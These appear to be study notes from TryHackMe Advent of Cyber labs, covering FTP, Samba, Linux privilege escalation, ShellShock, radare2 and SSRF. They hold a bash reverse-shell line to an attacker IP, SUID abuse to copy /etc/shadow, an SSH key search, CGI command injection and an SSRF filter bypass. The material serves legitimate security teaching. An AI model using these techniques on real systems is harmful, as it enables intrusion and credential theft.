&& 	Use this operator to combine multiple filters together. 	For example, to show all packets associated with two different IP addresses ip.addr == 192.168.1.1 && ip.addr == 192.168.1.10 will only show packets with the source or destination IP addresses of 192.168.1.1 or 192.168.1.10

***Exporting data from Wireshark:***

As previously shown, Wireshark is capable of exporting data from protocols such as HTTP by navigating to "File → Export Objects" and selecting the protocol available. In the screenshots below, we are listing objects that can be exported from the file-sharing SMB protocol.


***9.3. What is FTP & Where is it Used?***
The File Transfer Protocol (FTP) offers a no-thrills means of file sharing in comparison to alternative
protocols available. Whilst this protocol is unencrypted, it can be accessed through a variety of means; from dedicated software like FileZilla, the command line, or web browsers, FTP Servers have been long used to share files between devices across the Internet due to its compatibility.


Accessing an FTP server using the Mozilla Firefox Web Browser.

FTP uses two connections when transferring data, as illustrated below:


(Cyberhoot., 2020)

The standard for these two connections are the two ports:

    Port 20 (Data)
    Port 21 (Commands)

Commands involve actions such as listing or navigating directories, writing to files. Whereas, the data port is where actual data such as the downloading/uploading of files are transferred over.



9.4. No Credentials? No Problem! 
Before any data can be shared, the client must log in to the FTP Server. This is to determine the commands that the client has the permission to execute, and the data that can be shared. Some websites use FTP to share files instead of the web server itself. Of course, this means that you'd have to share a username/password through some other way - that's not practical.

Enter FTP's "Anonymous" mode...This setting allows a default username to be used with any password by a client. This user is treated like any other user on the FTP server - including enforcing permissions and privileges to commands and data.



9.5. Using FTP Over Terminal


We're going to be using the "FTP" package that comes installed on most Linux environments but especially the THM AttackBox.To connect, we simply use ftp and provide the IP address of the Instance. In my case, I would use ftp 10.10.185.239, but you would need to use ftp 10.10.18.26 for your vulnerable Instance.

When prompted for our "Name", we enter "anonymous". If successful, we have confirmed that the FTP Server has "anonymous" mode enabled - successful login looking like so:

You can use the help command to list some of the commands you can run whilst connected to the FTP Server. Here's a quick rundown of the fundamentals:
Command 	Description
ls 	List files and directories in the working directory on the FTP server
cd 	Change our working directory on the FTP server
get 	Download a file from the FTP server to our device
put 	Upload a file from our device to the FTP server

Let's look at the directories available to us using ls. There is only one folder with data that our user has permission to access:

We'll navigate to this using cd to change our working directory and then  ls to list the contents. The file within this folder contains a file with a ".sh" extension. This extension is a shell script, that when executed, will run commands that we program. Let's use get to get the file from the server onto our device, so we understand why this file has been left here!



9.6. Finding our Exploit
With the file downloaded, let's open it on our device using a terminal text editor such as nano.

We don't need to understand what happens here outside of the comments. The script executes every minute (according to Elf McEager), creates a backup of a folder and stores it in Elf McEager's home directory. What if we were to replace the commands executed in this script with our own, malicious commands? Uploading a file requires separate permission that shouldn't be granted to the "anonymous" user. However, permissions are very easy to oversight - such as in the case here.

9.6.1. Let's use pentesters cheatsheet to get a good command that will be executed by the server to
generate a shell to our AttackBox, replacing the IP_ADDRESS with your TryHackMe IP, this address is displayed on the navigation bar on the Access page.

bash -i >& /dev/tcp/Your_TryHackMe_IP/4444 0>&1

9.6.2. Let's set up a netcat listener to catch the connection on our AttackBox: nc -lvnp 4444

9.6.3. We'll now attempt to upload our malicious script to the folder that we have write permissions on the FTP server by returning to our FTP prompt
and using put to put the file into that directory (ensuring it is your current directory).

9.6.4. Return to our netcat listener, after waiting one minute, you should see an output like below! Success! We have a reverse system shell on the FTP Server as the most powerful user. Any commands you now use will execute on the FTP server's system.

Proceed to use commands similar to what we have used before to find the contents of root.txt located in the root directory! Let's break down exactly what happened here and explain the reasons as why this exploit happened:

9.6.5.1. The FTP Server has anonymous mode enabled allowing us to authenticate. This isn't inherently
insecure and has many legitimate uses.

9.6.5.2. We've discovered that we have permission to upload and download files. Whilst is also normal behaviour for FTP servers, anonymous users should not be able to upload files.

9.6.5.3. We've interpreted the information from a legitimate backup script to create a reverse shell onto our host.

9.6.5.4. The script executes as the "root" user - the most powerful on a Linux system. This is also a vulnerability, as now we have full access to the system. The use of this user should be restricted wherever possible. If the script were to execute as "elfmceager", we'd only have access to the system as that user (a much less powerful one in comparison)



***10.3. What is Samba & where is it Used?***

Whilst we learnt about one of the most commonplace protocols that are used for file-sharing on Day 10, we'll be covering an alternative technology for file-sharing that is most used within organisation/company networks. Offering encryption as standard, this technology consists of two protocols:

    SMB (Server Message Block) - Natively supported by Windows and not Linux
    NFS (Network File System) - Natively supported by Linux and not Windows

Protocols such as SMB send "requests" and "responses" when communicating with each other, as illustrated below:

(TechTarget., 2017)

What makes Samba so popular and useful is that it removes the differences between these two protocols, meaning that the two operating systems can now share resources including files amongst each other. Simply, Samba connects to a "share" (think of this as a virtual folder) and is capable of day-to-day activities like deleting, moving or uploading files.

Samba is flexible in the sense it can be useful for both you and me or businesses with thousands of employees. For example, employees can access documents from a central computer rather than each employee storing their own copy. As previously mentioned, this technology is encrypted enabling sensitive data like username and passwords used in the authentication process (and the data itself)  to be communicated between client/server securely.

Unlike FTP, other IT devices such as network printers can also be shared between client/server.

10.4. Searching for Samba Shares
We're going to be using the enum4linux tool that is already provided to you on the THM AttackBox. Let's get our hands dirty!

    Open a terminal prompt and navigate to enum4linux: cd /root/Desktop/Tools/Miscellaneous
    Run enum4linux and list all the possible options we could use, take time to study these for anything
    interesting:  ./enum4linux.pl -h

Note how we can use options like -S to list shares or -U (note the uppercase) to list possible users. In
my example, I want to find out who can be used to access the server through Samba: ./enum4linux.pl -U 10.10.95.99

11.3. What is Privilege Escalation?

You may be surprised to find out that privilege escalation is something that you do daily. On computing systems, there is a general rule of thumb that determines how someone interacts with a computer system and the resources within it. There are two primary levels of permissions that a person may have to a computer system:

    User
    Administrator

Generally speaking, only Administrators can modify system settings or change the permissions of other users resources like files and folders.

Users may be further divided into roles such as within a company. Staff in HR are only able to access HR documents whereas accounting staff are only able to access accounting resources.

Privilege escalation is simply the process of increasing the current privileges we have to permissions above us. In the screenshot below, we are escalating our privileges to Administrator to run Command prompt on Windows 10:

A normal process of privilege escalation

As a pentester, we often want to escalate our privileges to that of another user or administrator to have full access to a system. We can discover and abuse misconfigurations or bugs within a system to escalate these privileges where this shouldn't be possible otherwise.

11.4. The directions of privilege escalation

The process of escalating privileges isn't as clear-cut as going straight from a user through to administrator in most cases. Rather, slowly working our way through the resources and functions that other users can interact with.

11.4.1. Horizontal Privilege Escalation:

A horizontal privilege escalation attack involves using the intended permissions of a user to abuse a vulnerability to access another user's resources who has similar permissions to you. For example, using an account with access to accounting documents to access a HR account to retrieve HR documents. As the difference in the permissions of both the Accounting and HR accounts is the data they can access, you aren't moving your privileges upwards.

11.4.2. Vertical Privilege Escalation:

A bit more traditional, a vertical privilege escalation attack involves exploiting a vulnerability that allows you to perform actions like commands or accessing data acting as a higher privileged account such as an administrator.

Remember the attack you performed on "Day 1 - A Christmas Crisis"? You modified your cookie to access Santa's control panel. This is a fantastic example of a vertical privilege escalation because you were able to use your user account to access and manage the control panel. This control panel is only accessible by Santa (an administrator), so you are moving your permissions upwards in this sense.

11.5. Reinforcing the Breach

A common issue you will face in offensive pentesting is instability. The very nature of some exploits relies on a heavy hand of luck and patience to work. Take for example the Eternalblue exploit which conducts a series of vulnerabilities in how the Windows OS allocates and manages memory. As the exploit writes to memory in an in-proper way, there is a chance of the computer crashing. We'll showcase a means of stabilising our connection in the section below.

Let's exploit a local copy of a DVWA (Damn Vulnerable Web App) and use a vulnerability called command injection to create a reverse connection to our device. Highlighted in red is the system command to utilise Netcat to connect back to our attacking machine:

Verifying a successful reverse connection, we execute two initial commands to get a bit of insight as to how we should progress:

Executing the whoami command allows us to see what the name of the account that we are executing commands as. echo $0 informs us of our shell - it is currently a /bin/sh. This is a simple shell in comparison to a "/bin/bash". In shells like our current Netcat, we don't have many luxuries such as tab-completion and re-selecting the last command executed (using the up-arrow), but importantly, we can't use commands that ask for additional input i.e. providing SSH credentials or using the substitute user command su

Modern Ubuntu installs come with python3 installed, we can spawn another shell and begin to make it interactive:
python -c 'import pty; pty.spawn("/bin/bash")'


There are many ways you can make your shell interactive if Python is not installed.

11.6. You Thought Enumeration Stopped at Nmap?

Wrong! We were just getting started. After gaining initial access, it's essential to begin to build a picture of the internals of the machine. We can look for a plethora of information such as other services that are running, sensitive data including passwords, executable scripts of binaries to abuse and more!

For example, we can use the find command to search for common folders or files that we may suspect to be on the machine:

    backups
    password
    admin
    config

Our vulnerable machine in this example has a directory called backups containing an SSH key that we can use for authentication. This was found via: find / -name id_rsa 2> /dev/null....Let's break this down:

    We're using find to search the volume, by specifying the root (/) to search for files named "id_rsa" which is the name for private SSH keys, and then using 2> /dev/null to only show matches to us.

Can you think of any other files or folders we may want to find?

11.7. The "Priv Esc Checklist"

As you progress through your pentesting journey, you will begin to pick up a certain workflow for how you approach certain stages of an engagement. Whilst this workflow is truly yours, it will revolve around some fundamental steps in looking for vulnerabilities for privilege escalation.

    Determining the kernel of the machine (kernel exploitation such as Dirtyc0w)
    Locating other services running or applications installed that may be abusable (SUID & out of date software)
    Looking for automated scripts like backup scripts (exploiting crontabs)
    Credentials (user accounts, application config files..)
    Mis-configured file and directory permissions

Checkout some checklists that can be used as a cheatsheet for the enumeration stage of privilege escalation:

    g0tmi1k
    payatu
    PayloadAllTheThings

11.8. Vulnerability: SUID 101

For today's material, we're going to be showcasing the resource that is GTFOBins and explaining how the misconfigured permissions of applications can be exploited to escalate our privileges to an administrator.

Firstly, this begs the question...what is SUID exactly? Well, let's get on the same page by detailing how permissions work in Linux exactly. A benefit of Linux is its granularity in file permissions - they are, however, rather intimidating to approach. When performing commands like ls -l to list the permissions of our current directory:

   [A]         [B]     [C]
drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir
drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir2
drwxrwxr-x 2 cmnatic cmnatic 4096 Dec 8 18:33 exampledir3
-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile
-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile2
-rw-rw-r-- 1 cmnatic cmnatic 0 Dec 8 18:33 examplefile3

Our directory has three directories "exampledir[3]" and three files "examplefile[3]". I've listed the four columns of interest here:
Column Letter   Description Example
[A] filetype (d is a directory - is a file) and the user and group permissions "r" for reading, "w" for write and "x" for executing.
    A file with -rw-rw-r-- is read/write to the user and group only. However, every other user has read access only
[B]
    the user who owns the file
    cmnatic (system user)
[C]
    the group (of users) who owns the file
    sudoers group


At the moment, the "examplefiles" are not executable as there is no "x" present for either the user or group. When setting the executable permission (chmod +x filename), this value changes (note the "x" in the snippet below -rwxrwxr):

-rwxrwxr-x 1 cmnatic cmnatic 0 Dec 8 18:43 backup.sh 

Normally, executables and commands (commands are just shortcuts to executables) will execute as the user who is running them (assuming they have the file permissions to do so.) This is why some commands such as changing a user's password require sudo in front of them. The sudo allows you to execute something with the permissions as root (the most privileged user). Users who can use sudo are called "sudoers" and are listed in /etc/sudoers (we can use this to help identify valuable users to us).

SUID is simply a permission added to an executable that does a similar thing as sudo. However, instead, allows users to run the executable as whoever owns it as demonstrated below:
            
            


Filename    File Owner  User who is executing the file  User that the file is executed as
ex1 root    cmnatic root
ex2 cmnatic cmnatic cmnatic
ex3 service danny   service


Suddenly with the introduction of SUID, users no longer have to be a sudoer to run an executable as root. This can be legitimately used to allow applications that specific privileges to run that another user can't have.

11.9. Abusing SUID (GTFOBins)

Now that we understand why executables with this SUID permission are so enticing, let's begin to learn how to find these and understand the capabilities we can do with some of these executables. At the surface, SUID isn't inherently insecure. It's only when you factor in the misconfiguration of permissions (and given the complexity on Linux - is very easy to do); Administrators don't adhere to the rule of least privileges when troubleshooting.

Executables that are capable of interacting with the operating system such as reading/writing files or creating shells are goldmines for us. Thankfully, GTFOBins is a website that lists a majority of applications that do such actions for us. Let's set the SUID on the cp command that is used to copy files with chmod u+s /usr/bin/cp

Note how the cp executable is owned by "root" and now has the SUID permission set:

cmnatic@docker-ubuntu-s-1vcpu-1gb-lon1-01:~$ ls -al /usr/bin | grep "cp"
-rwsr-xr-x 1 root root 153976 Sep 5 2019 cp
The cp command will now be executed as root - meaning we can copy any file on the system. Some locations may be of interest to us:
    copying the contents of other user directories (i.e. bash history, ssh keys, user.txt)
    copying the contents of the "/root" directory (i.e. "/root/flag.txt")
    copy the "/etc/passwd" & "/etc/shadow" files for password cracking
Let's confirm this by using find to search the machine for executables with the SUID permission set: find / -perm -u=s -type f 2>/dev/null
And now using cp to copy the contents of "/root" into our directory ("/home/cmnatic"):
11.10. Introducing Enumeration Scripts (Doing the leg work for us...)
Fortunately for us, there are many enumeration scripts available to use that automate some of the enumeration processes for us. We can download these onto our own machine and use a few methods to upload them to our vulnerable target instance. Bear in mind that vulnerable target Instances that you deploy on TryHackMe do not have internet access, so we must use our own attacking machine that is connected to the THM network.

A great script that is essential to anyone's toolkit is "LinEnum" that is available for download from here. LinEnum enumerates the target machine for us, detailing and collating useful information such as kernel versions, permissions to any executables or files that are outside of the users home directory - and a whole plethora more!

The problem with this? It's easy to get lost within it all. Enumeration scripts often return lots of information that is often not all that useful to us; It's important to understand how these enumeration scripts work so as not to rely on them. However, these scripts make privilege escalation that much more approachable for beginners.

11.10.1. Let's download the LinEnum script to our own machine using wget:

11.10.2. Let's use Python3 to turn our machine into a web server to serve the LinEnum.sh script to be downloaded onto the target machine. Make sure you run this command in the same directory that you downloaded LinEnum.sh to: python3 -m http.server 8080

11.10.3. We need to upload this to the vulnerable Instance (MACHINE_IP) whilst ensuring that our own device is connected to the THM network. There are many ways this can be done which will depend on the vulnerable Instance you are attacking; the vulnerable Instance may not have tools such as wget, so alternatives will need to be used.

11.10.3.1. Navigate to a directory that we will have write permission to. The /tmp directory allows all users to write to it - so we will use this.

11.10.3.2. Using wget on the vulnerable Instance:

11.10.3.3. Using netcat:

11.10.3.3.1. Setup netcat on the vulnerable Instance to listen for an incoming file: nc -l -p 1337 > LinEnum.sh

11.10.3.3.2. Setup netcat on our own machine to send a file: nc -w -3 MACHINE_IP 1337 < LinEnum.sh

11.10.3.4. Add the execution permission to LinEnum.sh on the vulnerable Instance: chmod +x LinEnum.sh

11.10.3.5. Execute LinEnum.sh on the vulnerable Instance: ./LinEnum.sh


11.11. Covering our Tracks

The final stages of penetration testing involve setting up persistence and covering our tracks. For today's material, we'll detail the later as this is not mentioned nearly enough.

During a pentesting engagement, you will want to try to avoid detection from the administrators & engineers of your client wherever within the permitted scope of the pentesting engagement. Activities such as logging in, authentication and uploading/downloading files are logged by services and the system itself.

On Debian and Ubuntu, the majority of these are left within the "/var/log directory and often require administrative privileges to read and modify. Some log files of interest:

    "/var/log/auth.log" (Attempted logins for SSH, changes too or logging in as system users:)

    "/var/log/syslog" (System events such as firewall alerts:)

    "/var/log/<service/"
    For example, the access logs of apache2
        /var/log/apache2/access.log"


12.3. Vulnerability...reveal yourself!
As an application's lifecycle continues, so does its version numbering. Applications contain seemingly innocent hallmarks of information such as version numbering. Known as information disclosure, these nuggets of information are handed to us by the server through error messages such as in the following screenshot, HTTP headers or even on the website itself.

An attacker can use knowledgebases such as Rapid7, AttackerKB, MITRE or Exploit-DB to look for vulnerabilities associated with the version number of that application. Vulnerabilities are attributed by a CVE number. You can learn more about these in MuirlandOracle's Intro to Research room.



12.4. Everything CGI (And no, not the movie kind...)
As you may have discovered throughout the "Web" portion of the event, webservers don't just display websites...They are capable of interacting with the operating system directly. The Common Gateway Interface or CGI for short is a standard means of communicating and processing data between a client such as a web browser to a web server.

Simply, this technology facilitates interaction with programmes such as Python script files, C++ and Java application, or system commands all within the browser - as if you were executing it on the command line.


(America Online., 1999)

Despite their age, CGI scripts are still relied upon from devices such as embedded computers to IoT devices, Routers, and the likes, who can't run complex frameworks like PHP or Node.


12.5. The Nitty Gritty
Whilst CGI has the right intentions and use cases, this technology can quickly be abused by people like us! The commonplace for CGI scripts to be stored is within the /cgi-bin/ folder on a webserver. Take, for example, this systeminfo.sh file that displays the date, time and the user the webserver is running as:

When navigating to the location of this script using our browser, the script is executed on the web server, the resulting output of this is then displayed to us. How could we use this?

12.6. As We've Demonstrated...
We could, perhaps, parse our own commands through to this script that will be executed. Because we know that this is a Ubuntu machine,  we can try some Linux commands like ls to list the contents of the working directory:


Or on a Windows machine, the systeminfo command reveals some useful information:

This is achieved by parsing the command as an argument with ?& i.e. ?&ls. As this is a web server, any spaces or special characters will need to be URL encoded.

12.7. There are tools for this! Practical Metasploit
Now we understand the application that's running, tools such as Metasploit can be used to confirm suspicions and hopefully leverage them! After some independent research, this application is vulnerable to the ShellShock attack (CVE 2014-6271)

Let's start Metasploit's console and use the ShellShock payload. (TryHackMe's room and blog post on Metasploit will be useful here)

At the minimum, when using an exploit, Metasploit needs to know two things:

    Your machine (such as the TryHackMe AttackBox) that you're attacking from (LHOST)
    The target that you're attacking (RHOST(S))

Exploits will have their own individual settings that you will need to configure. We can list these by using the options command, then using set OPTION VALUE accordingly. In our example, the exploit involves CGI scripts and as such, we must specify the location of the script on the webserver that we're attacking. In the example so far, this was at http://10.0.0.1/cgi-bin/systeminfo.sh

In order for the attack used as the example in this task to work, the options would be set like so:

    LHOST - 10.0.0.10 (our PC)
    RHOST - 10.0.0.1 (the remote PC)
    TARGETURI /cgi-bin/systeminfo.sh (the location of the script)


Please note that these options are for the exploit used as an example, you will have to set these values accordingly for the challenge.

After ensuring our options are set right, Let's run the exploit to get a Meterpreter connection...Success!

To run system commands on the host, we will use shell. By creating a shell on the remote host, we can run system commands as if it were our own PC.

***2. Introduction to x86-64 Assembly***

Computers execute machine code, which is encoded as bytes, to carry out tasks on a computer. Since different computers have different processors, the machine code executed on these computers is specific to the processor. In this case, we’ll be looking at the Intel x86-64 instruction set architecture which is most commonly found today. Machine code is usually represented by a more readable form of the code called assembly code. This machine is code is usually produced by a compiler, which takes the source code of a file, and after going through some intermediate stages, produces machine code that can be executed by a computer.

Without going into too much detail, Intel first started out by building a 16-bit instruction set, followed by 32 bit, after which they finally created 64 bit. All these instruction sets have been created for backward compatibility, so code compiled for 32-bit architecture will run on 64-bit machines. As mentioned earlier, before an executable file is produced, the source code is first compiled into assembly(.s files), after which the assembler converts it into an object program(.o files), and operations with a linker finally make it an executable. 

The best way to actually start explaining assembly is by diving in. We’ll be using radare2 to do this - radare2 is a framework for reverse engineering and analysing binaries. It can be used to disassemble binaries(translate machine code to assembly, which is actually readable) and debug said binaries(by allowing a user to step through the execution and view the state of the program).

Luckily for us, everything we need has been provided to you via an Instance that you can deploy and log into:

    Press the "Deploy" button on the top-right of this task
    Wait for the IP address of the target Instance to display
    Log into your Instance using the following information:

IP Address: MACHINE_IP

Username: elfmceager

Password: adventofcyber

Let's proceed to run through how Radare2 works exactly. Although you shouldn't do this if the program is unknown, it is safe for us to execute to see what should be happening like so:


The above program shows that there are 3 variables(a, b, c) where c is the sum of a and b. 

Time to see what’s happening under the hood! Run the command r2 -d ./file1

This will open the binary in debugging mode. Once the binary is open, one of the first things to do is ask r2 to analyze the program, and this can be done by typing in: aa

Note, when using the aa command in radare2, this may take between 5-10 minutes depending on your system.

Which is the most common analysis command. It analyses all symbols and entry points in the executable. The analysis, in this case, involves extracting function names, flow control information, and much more! r2 instructions are usually based on a single character, so it is easy to get more information about the commands.

I.e. For general help, we can run: ? or if we wish to understand more about a specific feature, we could provide a?

3. Computer says...Done?!

Once the analysis is complete, you would want to know where to start analysing from - most programs have an entry point defined as main. To find a list of the functions run: afl


Note that memory addresses may be different on your computer. 


As seen here, there actually is a function at main. Let’s examine the assembly code at main by running the command pdf @main Where pdf means print disassembly function. Doing so will give us the following view:




3. Register me this, register me that...
The core of assembly language involves using registers to do the following: 

    Transfer data between memory and register, and vice versa
    Perform arithmetic operations on registers and data
    Transfer control to other parts of the program Since the architecture is x86-64, the registers are 64 bit and Intel has a list of 16 registers:

Initial Data Type   Suffix  Size (bytes)
Byte    b   1
Word    w   2
Double Word  l
    4
Quad    q   8
Single Precision
    s   4
Double Precision
    l
    8

When dealing with memory manipulation using registers, there are other cases to be considered:

    (Rb, Ri) = MemoryLocation[Rb + Ri]
    D(Rb, Ri) = MemoryLocation[Rb + Ri + D]
    (Rb, Ri, S) = MemoryLocation(Rb + S * Ri]
    D(Rb, Ri, S) = MemoryLocation[Rb + S * Ri + D]


4. Read the instructions!

Some other important instructions are:

    leaq source, destination: this instruction sets destination to the address denoted by the expression in source
    addq source, destination: destination = destination + source
    subq source, destination: destination = destination - source
    imulq source, destination: destination = destination * source
    salq source, destination: destination = destination << source where << is the left bit shifting operator
    sarq source, destination: destination = destination >> source where >> is the right bit shifting operator
    xorq source, destination: destination = destination XOR source
    andq source, destination: destination = destination & source
    orq source, destination: destination = destination | source

Now let’s actually walk through the assembly code to see what the instructions mean when combined.

The line starting with sym.main indicates we’re looking at the main function. The next 3 lines are used to represent the variables stored in the function. The second column indicates that they are integers(int), the 3rd column specifies the name that r2 uses to reference them and the 4th column shows the actual memory location.

The first 3 instructions are used to allocate space on that stack (ensures that there’s enough room for variables to be allocated and more). We’ll start looking at the program from the 4th instruction (movl $4). We want to analyse the program while it runs and the best way to do this is by using breakpoints.

A breakpoint specifies where the program should stop executing. This is useful as it allows us to look at the state of the program at that particular point. So let’s set a breakpoint using the command db  in this case, it would be db 0x00400b55 To ensure the breakpoint is set, we run the pdf @main command again and see a little b next to the instruction we want to stop at.

Now that we’ve set a breakpoint, let’s run the program using dc


Running dc will execute the program until we hit the breakpoint. Once we hit the breakpoint and print out the main function, the rip which is the current instruction shows where execution has stopped. From the notes above, we know that the mov instruction is used to transfer values.  This statement is transferring the value 4 into thelocal_ch variable. To view the contents of the local_ch variable, we use the following instruction px @memory-address In this case, the corresponding memory address for local_ch will be rbp-0xc ( from the first few lines of @pdf main) This instruction prints the values of memory in hex:



This shows that the variable currently doesn’t have anything stored in it (it’s just 0000). Let’s execute this instruction and go to the next one using the following command (which only goes to the next instruction) ds If we view the memory location after running this command, we get the following:

We can see that the first 2 bytes have the value 4! If we do the same process for the next instruction, we’ll see that the variable local_8h has the value 5.


If we go to the instruction movl local_8h, %eax, we know from the notes that this moves the value from local_8h to the %eax register. To see the value of the %eax register, we can use the command:



If we execute the instruction and run the dr command again, we get:


This technically skips the previous instruction movl local_ch, %edx but the same process can be applied to it. Showing the value of rax (the 64 bit version) to be 5. We can do the same for similar instructions and view the values of the registers changing. When we come to the addl %edx, %eax, we know that this will add the values in edx and eax and store them in eax. Running dr shows us the rax contains 5 and rdx contains 4, so we’d expect rax to contain 9 after the instruction is executed:


Executing ds to move to the next instruction then executing dr to view register variable shows us we are correct:


The next few instructions involve moving the values in registers to the variables and vice versa:



After that, a string (which is the output is loaded into a register and the printf function is called in the 3rd line. The second line clears the value of eax as eax is sometimes used to store results from functions. The 4th line clears the value of eax. The 5th and 6th lines are used to exit the main function. 

***Server-Side Request Forgery***

Server-Side Request Forgery (SSRF) is a web app vulnerability that allows attackers to force the web application server to make requests to resources it normally wouldn't. For example, a web app may have the functionality to produce screenshots of other websites when a user supplies a URL. This is perfectly valid functionality, however, URLs can also be made for internal IP addresses (e.g. 192.168.1.1, 10.10.10.10, 127.0.0.1 etc.) as well as internal-only hostnames (e.g. localhost, WIN2019SERV.CORP). If a web developer is not careful, an attacker could provide the app with these and manage to screenshot internal resources, which often have less protections.

To counter this, user-provided URLs can be checked before they are requested, to ensure that malicious values are not being used. However, due to the complex nature of URLs themselves, there are often many things an attacker can do to bypass these checks.

Note that while the example of SSRF used in this task is effectively a Remote File Inclusion (RFI) vulnerability as well, not every SSRF is. Some SSRF vulnerabilities only trigger a DNS lookup, while others may not return any kind of response to the web app, but can still be used to "port scan" internal systems by measuring the time each request takes to complete. In other cases, SSRF may be used as a form of Denial of Service (DoS) since the attacker can continually request that the server download large files simultaneously (taking up memory, disk space, and network bandwidth).
Walkthrough

    Once the VM is deployed, connect to the web app: http://10.10.240.249

    Enter a name in the form and click the "Search" button. When the page loads, it should tell you whether that name is on the Naughty List or the Nice List. Notice that the URL for the page looks something like this: http://10.10.240.249/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2Fsearch.php%3Fname%3DTib3rius

    If we use a URL decoder on the value of the "proxy" parameter, we get: http://list.hohoho:8080/search.php?name=Tib3rius

    Since "list.hohoho" is not a valid hostname on the Internet (.hohoho is not a top-level domain), this hostname likely refers to some back-end machine. It seems that the web app works by taking this URL, making a request at the back-end, and then returning the result to the front-end web app. If the developer has not been careful, we may be able to exploit this functionality using Server-Side Request Forgery (SSRF).

    The most obvious thing we can try to do first is to fetch the root of the same site. Browse to: http://10.10.240.249/?proxy=http%3A%2F%2Flist.hohoho%3A8080%2F 

    This seems to have potential, as in place of the original "Tib3rius is on the Nice List." message, we instead see "Not Found. The requested URL was not found on this server." This seems like a generic 404 message, indicating that we were able to make the server request the modified URL and return the response.

    There are many things we could do now, such as trying to find valid URLs for the "list.hohoho" site. We could also try changing the port number from 8080 to something else, to see if we can connect to any other services running on the host, even if these services are not web servers.

    Try changing the port number from 8080 to just 80 (the default HTTP port): http://10.10.240.249/?proxy=http%3A%2F%2Flist.hohoho%3A80

    The message now changes to "Failed to connect to list.hohoho port 80: Connection refused" which suggests that port 80 is not open on list.hohoho.

    Try changing the port number to 22 (the default SSH port): http://10.10.240.249/?proxy=http%3A%2F%2Flist.hohoho%3A22

    The message now changes to "Recv failure: Connection reset by peer" which suggests that port 22 is open but did not understand what was sent (this makes sense, as sending an HTTP request to an SSH server will not get you anywhere!)

    Enumerating open ports via SSRF can be performed in this manner, by iterating over common ports and measuring the differences between responses. Even in cases where error messages aren't returned, it is often possible to detect which ports are open vs closed by measuring the time each request takes to complete.

    Another thing we can try to do with SSRF is access services running locally on the server. We can do this by replacing the list.hohoho hostname with "localhost" or "127.0.0.1" (among others). Try this now: http://10.10.240.249/?proxy=http%3A%2F%2Flocalhost

    Oops! It looks like the developer has a check in place for this, as the message returned says "Your search has been blocked by our security team."

    Indeed, if you try other hostnames (e.g. 127.0.0.1, example.com, etc.) they will all be blocked. The developer has implemented a check to ensure that the hostname provided starts with "list.hohoho", and will block any hostnames that don't.

    As it turns out, this check can easily be bypassed. Since the hostname simply needs to start with "list.hohoho", we can take advantage of DNS subdomains and create our own domain "list.hohoho.evilsite.com" which resolves to 127.0.0.1. In fact, we don't even need to buy a domain or configure the DNS, because multiple domains already exist that let us do this. The one we will be using is localtest.me, which resolves every subdomain to 127.0.0.1.

    We can therefore set the hostname in the URL to "list.hohoho.localtest.me", bypass the check, and access local services: http://10.10.240.249/?proxy=http%3A%2F%2Flist.hohoho.localtest.me

    Success! It appears that there is a web server running locally, and it has a message from Elf McSkidy that contains some sensitive information we can use!